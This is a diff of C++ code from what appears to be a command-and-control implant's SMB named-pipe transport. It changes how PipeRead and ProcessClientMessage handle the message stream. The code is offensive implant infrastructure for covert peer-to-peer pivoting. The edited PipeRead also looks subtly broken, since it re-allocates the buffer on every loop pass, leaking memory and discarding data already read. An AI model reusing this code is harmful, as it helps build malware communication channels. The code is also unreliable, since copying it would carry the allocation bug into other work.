@@ -317,16 +317,17 @@ namespace Smb {
         }
     }
 
-    BOOL PipeRead(HANDLE handle, _stream *in) {
+    BOOL PipeRead(HANDLE handle, _stream **in) {
         HEXANE
 
         uint32_t read = 0;
         uint32_t total = 0;
 
         do {
-            auto length = MIN((in->length - total), PIPE_BUFFER_MAX);
+            auto length     = MIN(((*in)->length - total), PIPE_BUFFER_MAX);
+            (*in)->buffer   = B_PTR(x_malloc((*in)->length));
 
-            if (!Ctx->win32.ReadFile(handle, B_PTR(in->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
+            if (!Ctx->win32.ReadFile(handle, B_PTR((*in)->buffer) + total, length, R_CAST(LPDWORD, &read), nullptr)) {
                 if (ntstatus == ERROR_NO_DATA) {
                     return false;
                 }
@@ -334,7 +335,7 @@ namespace Smb {
 
             total += read;
         }
-        while (total < in->length);
+        while (total < (*in)->length);
         return true;
     }
 
@@ -365,7 +366,7 @@ namespace Smb {
         uint32_t read = 0;
 
         while (true) {
-            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(_stream), R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
+            if (!Ctx->win32.PeekNamedPipe(handle, &header, sizeof(uint32_t) * 4, R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
                 return false;
             }
 
@@ -382,7 +383,7 @@ namespace Smb {
         }
     }
 
-    BOOL ProcessClientMessage(HANDLE handle, _stream& stream) {
+    BOOL ProcessClientMessage(HANDLE handle, _stream **stream) {
         HEXANE
 
         uint32_t read = 0;
@@ -391,7 +392,7 @@ namespace Smb {
         if (!Ctx->win32.PeekNamedPipe(handle, &length, sizeof(uint32_t), R_CAST(LPDWORD, &read), NULL, NULL) || read == 0) {
             return false;
         }
-        if (!PipeRead(handle, &stream)) {
+        if (!PipeRead(handle, stream)) {
             return false;
         } else {
             return true;
@@ -428,7 +429,7 @@ namespace Smb {
                 while (PeekClientMessage(peer->ingress_handle, *stream, offset)) {
                     SetFilePointer(peer->ingress_handle, offset, NULL, FILE_BEGIN);
 
-                    if (!ProcessClientMessage(peer->ingress_handle, *stream)) {
+                    if (!ProcessClientMessage(peer->ingress_handle, &stream)) {
                         x_free(stream);
                         return_defer(ntstatus);
                     }
